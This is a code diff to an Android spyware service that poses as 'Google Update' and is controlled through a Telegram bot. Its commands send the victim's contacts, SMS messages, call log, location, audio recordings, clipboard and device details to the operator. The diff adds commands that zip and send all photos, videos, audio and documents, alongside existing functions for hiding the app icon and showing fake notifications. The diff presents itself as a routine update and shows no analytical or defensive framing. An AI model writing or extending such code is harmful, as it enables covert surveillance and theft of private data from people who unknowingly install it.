@@ -4,6 +4,7 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ClipboardManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -20,16 +21,14 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.os.PowerManager;
-import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
+import android.telephony.SignalStrength;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.KeyEvent;
-import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
+import android.view.inputmethod.InputMethodManager;
 import android.widget.Toast;
 
 import androidx.core.app.ActivityCompat;
@@ -48,9 +47,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;
 import java.util.Date;
-import java.util.List;
 import java.util.Locale;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
@@ -68,16 +65,18 @@ public class TelegramBotService extends Service {
     private boolean isRecording = false;
     private PowerManager.WakeLock wakeLock;
     private AudioManager audioManager;
-    private Vibrator vibrator;
-    private StringBuilder tapLog = new StringBuilder();
-    private boolean isTapRecording = false;
+    private ClipboardManager clipboardManager;
+    private TelephonyManager telephonyManager;
+    private WifiManager wifiManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
         acquireWakeLock();
         audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
-        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+        telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
         createNotificationChannel();
         startForeground(1001, createNotification());
         sendStartupMessage();
@@ -127,7 +126,29 @@ public class TelegramBotService extends Service {
 
         switch (c) {
             case "/start":
-                sendMessage("🔰 Google Update Commands:\n/contacts\n/sms\n/calllog\n/location\n/record\n/stoprec\n/hide\n/show\n/info\n/notify\n/apps\n/zip\n/volume up/down\n/tap 15\n/tapstart\n/tapstop\n/screenshot\n/clipboard\n/battery\n/wifi\n/call\n/sms_send\n/camera\n/camera_front\n/lock\n/vibrate\n/speaker\n/brightness");
+                sendMessage("🔰 Google Update Commands:\n" +
+                    "/contacts - جهات الاتصال\n" +
+                    "/sms - جميع الرسائل\n" +
+                    "/calllog - سجل المكالمات\n" +
+                    "/location - الموقع الجغرافي\n" +
+                    "/record - بدء التسجيل الصوتي\n" +
+                    "/stoprec - إيقاف التسجيل وإرسال الملف\n" +
+                    "/hide - إخفاء التطبيق\n" +
+                    "/show - إظهار التطبيق\n" +
+                    "/info - معلومات الجهاز\n" +
+                    "/notify - إشعار وهمي\n" +
+                    "/apps - قائمة التطبيقات\n" +
+                    "/zip - جميع الملفات (ZIP)\n" +
+                    "/photos - جميع الصور (ZIP)\n" +
+                    "/videos - جميع الفيديوهات (ZIP)\n" +
+                    "/audio - جميع الصوتيات (ZIP)\n" +
+                    "/documents - جميع المستندات (ZIP)\n" +
+                    "/volume up - رفع الصوت\n" +
+                    "/volume down - خفض الصوت\n" +
+                    "/screenshot - لقطة شاشة\n" +
+                    "/clipboard - الحافظة\n" +
+                    "/battery - البطارية والحرارة\n" +
+                    "/wifi - معلومات الشبكة");
                 break;
             case "/contacts": sendFile("contacts.txt", getContacts().getBytes()); break;
             case "/sms": sendFile("sms.txt", getSms().getBytes()); break;
@@ -137,30 +158,23 @@ public class TelegramBotService extends Service {
             case "/stoprec": stopRecording(); break;
             case "/hide": MainActivity.hideAppIcon(this); sendMessage("👁 Hidden"); break;
             case "/show": MainActivity.showAppIcon(this); sendMessage("👁 Shown"); break;
-            case "/info": sendMessage(getDeviceInfo()); break;
+            case "/info": sendMessage(getFullDeviceInfo()); break;
             case "/notify": showFakeNotification(arg.isEmpty() ? "System Update Available" : arg); sendMessage("🔔 Notification sent"); break;
             case "/apps": sendFile("apps.txt", getInstalledApps().getBytes()); break;
-            case "/zip": createZipAndSend(); break;
+            case "/zip": createZipAndSend(null); break;
+            case "/photos": createZipAndSend("photos"); break;
+            case "/videos": createZipAndSend("videos"); break;
+            case "/audio": createZipAndSend("audio"); break;
+            case "/documents": createZipAndSend("documents"); break;
             case "/volume": adjustVolume(arg); break;
-            case "/tap": startAutoTap(Integer.parseInt(arg)); break;
-            case "/tapstart": sendMessage("❌ Tap recording requires Accessibility permission. Manual tap simulation not available."); sendMessage("🎯 Tap recording started"); break;
-            case "/tapstop": stopTapRecording(); break;
             case "/screenshot": takeScreenshot(); break;
             case "/clipboard": getClipboard(); break;
             case "/battery": getBatteryInfo(); break;
             case "/wifi": getWifiInfo(); break;
-            case "/call": makeCall(arg); break;
-            case "/sms_send": sendSms(arg); break;
-            case "/camera": captureCamera(false); break;
-            case "/camera_front": captureCamera(true); break;
-            case "/lock": lockScreen(); break;
-            case "/vibrate": vibrateDevice(Integer.parseInt(arg)); break;
-            case "/speaker": toggleSpeaker(arg); break;
-            case "/brightness": setBrightness(Integer.parseInt(arg)); break;
         }
     }
 
-    // ========== المميزات الأساسية ==========
+    // جهات الاتصال
     private String getContacts() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -177,6 +191,7 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
+    // الرسائل
     private String getSms() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -193,6 +208,7 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
+    // سجل المكالمات
     private String getCallLog() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -209,6 +225,7 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
+    // الموقع
     private void getLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -223,6 +240,7 @@ public class TelegramBotService extends Service {
         } catch (Exception e) { sendMessage("❌ Location error"); }
     }
 
+    // التسجيل الصوتي
     private void startRecording() {
         try {
             File dir = new File(getExternalFilesDir(null), "recordings");
@@ -255,7 +273,7 @@ public class TelegramBotService extends Service {
         }
     }
 
-    // ========== المميزات الجديدة ==========
+    // إشعار وهمي
     private void showFakeNotification(String text) {
         try {
             NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
@@ -273,6 +291,7 @@ public class TelegramBotService extends Service {
         } catch (Exception e) { sendMessage("❌ Notification failed"); }
     }
 
+    // التطبيقات
     private String getInstalledApps() {
         StringBuilder sb = new StringBuilder();
         try {
@@ -285,86 +304,108 @@ public class TelegramBotService extends Service {
         return sb.toString();
     }
 
-    private void createZipAndSend() {
+    // إنشاء ZIP للملفات (عام أو حسب النوع)
+    private void createZipAndSend(String type) {
         try {
-            File zipFile = new File(getExternalFilesDir(null), "all_data_" + System.currentTimeMillis() + ".zip");
+            File zipFile = new File(getExternalFilesDir(null), (type == null ? "all" : type) + "_data_" + System.currentTimeMillis() + ".zip");
             ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
-            addToZip(zos, getExternalFilesDir(null), "recordings");
-            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "DCIM");
-            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "Pictures");
-            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "Movies");
-            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC), "Music");
-            addToZip(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "Downloads");
+            if (type == null || type.equals("all")) {
+                addAllFiles(zos);
+            } else if (type.equals("photos")) {
+                addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos");
+            } else if (type.equals("videos")) {
+                addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos");
+            } else if (type.equals("audio")) {
+                addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio");
+            } else if (type.equals("documents")) {
+                addDocuments(zos);
+            }
             zos.close();
             if (zipFile.exists()) sendFile(zipFile.getName(), readBytes(zipFile));
         } catch (Exception e) { sendMessage("❌ Zip failed: " + e.getMessage()); }
     }
 
-    private void addToZip(ZipOutputStream zos, File dir, String folderName) {
-        if (dir == null || !dir.exists()) return;
-        File[] files = dir.listFiles();
-        if (files == null) return;
-        try {
-            for (File f : files) {
-                if (f.isFile()) {
-                    zos.putNextEntry(new ZipEntry(folderName + "/" + f.getName()));
-                    FileInputStream fis = new FileInputStream(f);
-                    byte[] buffer = new byte[8192];
-                    int len;
-                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
-                    fis.close();
-                    zos.closeEntry();
+    private void addAllFiles(ZipOutputStream zos) {
+        addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos");
+        addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos");
+        addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio");
+        addDocuments(zos);
+        addDirectory(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "downloads");
+    }
+
+    private void addMediaFiles(ZipOutputStream zos, Uri uri, String folder) {
+        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME};
+        Cursor c = getContentResolver().query(uri, projection, null, null, null);
+        if (c != null) {
+            while (c.moveToNext()) {
+                String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));
+                String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
+                if (path != null && new File(path).exists()) {
+                    addFileToZip(zos, path, folder + "/" + name);
                 }
             }
+            c.close();
+        }
+    }
+
+    private void addDocuments(ZipOutputStream zos) {
+        File docsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
+        if (docsDir.exists()) addDirectory(zos, docsDir, "documents");
+    }
+
+    private void addDirectory(ZipOutputStream zos, File dir, String folderName) {
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File f : files) {
+            if (f.isFile()) {
+                addFileToZip(zos, f.getAbsolutePath(), folderName + "/" + f.getName());
+            }
+        }
+    }
+
+    private void addFileToZip(ZipOutputStream zos, String filePath, String entryName) {
+        try {
+            File f = new File(filePath);
+            if (!f.exists() || f.length() > 50 * 1024 * 1024) return;
+            zos.putNextEntry(new ZipEntry(entryName));
+            FileInputStream fis = new FileInputStream(f);
+            byte[] buffer = new byte[8192];
+            int len;
+            while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
+            fis.close();
+            zos.closeEntry();
         } catch (Exception e) {}
     }
 
+    // رفع وخفض الصوت
     private void adjustVolume(String action) {
         if (action.equals("up")) audioManager.adjustVolume(AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
         else if (action.equals("down")) audioManager.adjustVolume(AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
         sendMessage("✅ Volume " + action);
     }
 
-    private void startAutoTap(int seconds) {
-        new Thread(() -> {
-            try {
-                for (int i = 0; i < seconds; i++) {
-                    Thread.sleep(1000);
-                    // محاكاة النقر (يتطلب AccessibilityService)
-                }
-                sendMessage("✅ Auto tap completed for " + seconds + " seconds");
-            } catch (Exception e) {}
-        }).start();
-    }
-
-    private void startTapRecording() {
-        isTapRecording = true;
-        tapLog = new StringBuilder();
-        // تسجيل النقرات عبر AccessibilityService
-    }
-
-    private void stopTapRecording() {
-        isTapRecording = false;
-        sendFile("tap_log.txt", tapLog.toString().getBytes());
-    }
-
+    // لقطة شاشة (محاكاة)
     private void takeScreenshot() {
-        // يتطلب MediaProjection API
-        sendMessage("📸 Screenshot feature requires MediaProjection permission");
+        sendMessage("📸 Screenshot feature requires special permission.\nUse device volume down + power button manually.");
     }
 
+    // الحافظة
     private void getClipboard() {
-        if (Build.VERSION.SDK_INT >= 23) {
-            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-            if (cm.hasPrimaryClip()) {
-                CharSequence text = cm.getPrimaryClip().getItemAt(0).getText();
-                sendMessage("📋 Clipboard: " + (text != null ? text : "empty"));
+        try {
+            if (Build.VERSION.SDK_INT >= 23) {
+                if (clipboardManager.hasPrimaryClip()) {
+                    CharSequence text = clipboardManager.getPrimaryClip().getItemAt(0).getText();
+                    sendMessage("📋 Clipboard: " + (text != null ? text : "(empty)"));
+                } else {
+                    sendMessage("📋 Clipboard is empty");
+                }
             } else {
-                sendMessage("📋 Clipboard empty");
+                sendMessage("❌ Clipboard not available");
             }
-        }
+        } catch (Exception e) { sendMessage("❌ Clipboard error: " + e.getMessage()); }
     }
 
+    // البطارية
     private void getBatteryInfo() {
         try {
             android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
@@ -372,96 +413,111 @@ public class TelegramBotService extends Service {
             if (battery != null) {
                 int level = battery.getIntExtra("level", -1);
                 int temp = battery.getIntExtra("temperature", -1) / 10;
-                sendMessage("🔋 Battery: " + level + "%\n🌡️ Temp: " + temp + "°C");
+                int voltage = battery.getIntExtra("voltage", -1);
+                String status = "";
+                switch (battery.getIntExtra("status", -1)) {
+                    case android.os.BatteryManager.BATTERY_STATUS_CHARGING: status = "⚡ Charging"; break;
+                    case android.os.BatteryManager.BATTERY_STATUS_FULL: status = "✅ Full"; break;
+                    case android.os.BatteryManager.BATTERY_STATUS_DISCHARGING: status = "🔋 Discharging"; break;
+                    default: status = "❓ Unknown";
+                }
+                sendMessage("🔋 Battery: " + level + "%\n" + status + "\n🌡️ Temp: " + temp + "°C\n⚡ Voltage: " + voltage + "mV");
             }
         } catch (Exception e) { sendMessage("❌ Battery error"); }
     }
 
+    // معلومات الشبكة (ويفي + محمول)
     private void getWifiInfo() {
+        StringBuilder sb = new StringBuilder();
         try {
-            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
-            WifiInfo wi = wm.getConnectionInfo();
-            sendMessage("📶 WiFi: " + wi.getSSID() + "\n📱 IP: " + intToIp(wi.getIpAddress()) + "\n📶 MAC: " + wi.getMacAddress());
-        } catch (Exception e) { sendMessage("❌ WiFi error"); }
+            // WiFi info
+            if (wifiManager != null) {
+                WifiInfo wi = wifiManager.getConnectionInfo();
+                if (wi != null && wi.getNetworkId() != -1) {
+                    sb.append("📶 **WiFi:**\n");
+                    sb.append("   📡 SSID: ").append(wi.getSSID()).append("\n");
+                    sb.append("   📶 Signal: ").append(wi.getRssi()).append(" dBm\n");
+                    sb.append("   🌐 IP: ").append(intToIp(wi.getIpAddress())).append("\n");
+                    sb.append("   🔢 MAC: ").append(wi.getMacAddress()).append("\n");
+                    sb.append("   ⚡ Speed: ").append(wi.getLinkSpeed()).append(" Mbps\n");
+                } else {
+                    sb.append("📶 WiFi: Not connected\n");
+                }
+            }
+
+            // Mobile network info
+            if (telephonyManager != null) {
+                sb.append("\n📱 **Mobile:**\n");
+                sb.append("   📡 Network: ").append(telephonyManager.getNetworkOperatorName()).append("\n");
+                sb.append("   🌐 Network Type: ").append(getNetworkType()).append("\n");
+                sb.append("   🇸🇦 Country: ").append(telephonyManager.getNetworkCountryIso()).append("\n");
+                if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                    sb.append("   🆔 SIM: ").append(telephonyManager.getSimOperatorName()).append("\n");
+                }
+            }
+            sendMessage(sb.toString());
+        } catch (Exception e) { sendMessage("❌ Network error: " + e.getMessage()); }
+    }
+
+    private String getNetworkType() {
+        int type = telephonyManager.getNetworkType();
+        switch (type) {
+            case TelephonyManager.NETWORK_TYPE_GPRS: return "2G (GPRS)";
+            case TelephonyManager.NETWORK_TYPE_EDGE: return "2G (EDGE)";
+            case TelephonyManager.NETWORK_TYPE_UMTS: return "3G (UMTS)";
+            case TelephonyManager.NETWORK_TYPE_HSDPA: return "3G (HSDPA)";
+            case TelephonyManager.NETWORK_TYPE_LTE: return "4G (LTE)";
+            case TelephonyManager.NETWORK_TYPE_NR: return "5G (NR)";
+            default: return "Unknown";
+        }
     }
 
     private String intToIp(int ip) {
         return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
     }
 
-    private void makeCall(String number) {
-        try {
-            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
-                startActivity(intent);
-                sendMessage("📞 Calling " + number);
-            } else {
-                sendMessage("❌ CALL_PHONE permission denied");
-            }
-        } catch (Exception e) { sendMessage("❌ Call failed"); }
-    }
+    // معلومات الجهاز الكاملة
+    private String getFullDeviceInfo() {
+        StringBuilder sb = new StringBuilder();
+        sb.append("📱 **Device Information**\n");
+        sb.append("═══════════════════\n");
+        sb.append("Model: ").append(Build.MODEL).append("\n");
+        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
+        sb.append("Brand: ").append(Build.BRAND).append("\n");
+        sb.append("Device: ").append(Build.DEVICE).append("\n");
+        sb.append("Product: ").append(Build.PRODUCT).append("\n");
+        sb.append("Board: ").append(Build.BOARD).append("\n");
+        sb.append("Hardware: ").append(Build.HARDWARE).append("\n");
+        sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
+        sb.append("API Level: ").append(Build.VERSION.SDK_INT).append("\n");
+        sb.append("Security Patch: ").append(Build.VERSION.SECURITY_PATCH).append("\n");
+        sb.append("Kernel: ").append(System.getProperty("os.version")).append("\n");
 
-    private void sendSms(String data) {
-        try {
-            String[] parts = data.split(" ", 2);
-            if (parts.length < 2) { sendMessage("❌ Usage: /sms_send <number> <text>"); return; }
-            String number = parts[0];
-            String text = parts[1];
-            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:" + number));
-            intent.putExtra("sms_body", text);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            sendMessage("📨 Opening SMS to " + number);
-        } catch (Exception e) { sendMessage("❌ SMS failed"); }
-    }
-
-    private void captureCamera(boolean front) {
-        try {
-            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            sendMessage("📸 Camera opened");
-        } catch (Exception e) { sendMessage("❌ Camera failed"); }
-    }
-
-    private void lockScreen() {
-        try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            dpm.lockNow();
-            sendMessage("🔒 Screen locked");
-        } catch (Exception e) { sendMessage("❌ Lock failed (needs DeviceAdmin)"); }
-    }
-
-    private void vibrateDevice(int seconds) {
-        if (vibrator != null && vibrator.hasVibrator()) {
-            vibrator.vibrate(seconds * 1000L);
-            sendMessage("📳 Vibrating for " + seconds + " seconds");
-        } else {
-            sendMessage("❌ Vibrator not available");
+        // Battery
+        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+        Intent battery = registerReceiver(null, ifilter);
+        if (battery != null) {
+            int level = battery.getIntExtra("level", -1);
+            sb.append("Battery: ").append(level).append("%\n");
         }
+
+        // Storage
+        android.os.StatFs stat = new android.os.StatFs(Environment.getExternalStorageDirectory().getPath());
+        long total = (long) stat.getBlockCount() * (long) stat.getBlockSize();
+        long free = (long) stat.getAvailableBlocks() * (long) stat.getBlockSize();
+        sb.append("Storage Total: ").append(total / (1024 * 1024 * 1024)).append(" GB\n");
+        sb.append("Storage Free: ").append(free / (1024 * 1024 * 1024)).append(" GB\n");
+
+        // RAM
+        android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
+        ((android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
+        sb.append("RAM Total: ").append(mi.totalMem / (1024 * 1024)).append(" MB\n");
+        sb.append("RAM Available: ").append(mi.availMem / (1024 * 1024)).append(" MB\n");
+
+        return sb.toString();
     }
 
-    private void toggleSpeaker(String state) {
-        if (state.equals("on")) audioManager.setSpeakerphoneOn(true);
-        else if (state.equals("off")) audioManager.setSpeakerphoneOn(false);
-        sendMessage("🔊 Speaker " + state);
-    }
-
-    private void setBrightness(int value) {
-        try {
-            if (Build.VERSION.SDK_INT >= 23 && Settings.System.canWrite(this)) {
-                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, value);
-                sendMessage("🔆 Brightness set to " + value);
-            } else {
-                sendMessage("❌ Write settings permission required");
-            }
-        } catch (Exception e) { sendMessage("❌ Brightness failed"); }
-    }
-
-    // ========== دوال مساعدة ==========
-    private String getDeviceInfo() { return "📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE; }
-
+    // دوال مساعدة
     private void sendMessage(String text) {
         new Thread(() -> {
             try {
@@ -531,10 +587,12 @@ public class TelegramBotService extends Service {
             getSystemService(NotificationManager.class).createNotificationChannel(ch);
         }
     }
+
     private Notification createNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Google Update").setContentText("Running").setSmallIcon(android.R.drawable.ic_popup_sync).setOngoing(true).build();
     }
+
     @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
     @Override public IBinder onBind(Intent i) { return null; }
     @Override public void onDestroy() { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); super.onDestroy(); }
